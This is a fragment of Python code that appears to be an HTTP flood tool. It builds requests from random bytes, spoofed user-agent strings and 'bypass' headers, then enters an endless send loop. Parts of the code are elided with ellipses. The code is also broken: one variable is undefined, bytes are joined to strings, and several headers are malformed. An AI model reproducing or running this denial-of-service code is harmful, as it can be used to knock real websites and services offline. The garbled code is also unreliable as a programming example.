import threading, os, sys, socket, time, requests, random
useragents = [
...
def start():
    ...
    agent1 = random._urandom(1024)
    hh = random._urandom(randomip)
    xx = "."
    xb = int
    bypass_agent = agent1 + hh + "\r\n"
    Sockx4 = "Sock4: "+random.choice(Socks4)+random.choice(bypass_agent)+"\r\n"
    useragent = "useragents: "+random.choice(useragents)+random.choice(bypass_agent)+"\r\n"
    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    host1      =  "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1"
    bypass_user = bypass_agent+ host1 + Sockx4 + host1 + useragent + host1 + length + content + "\r\n"
    while True:
          try:
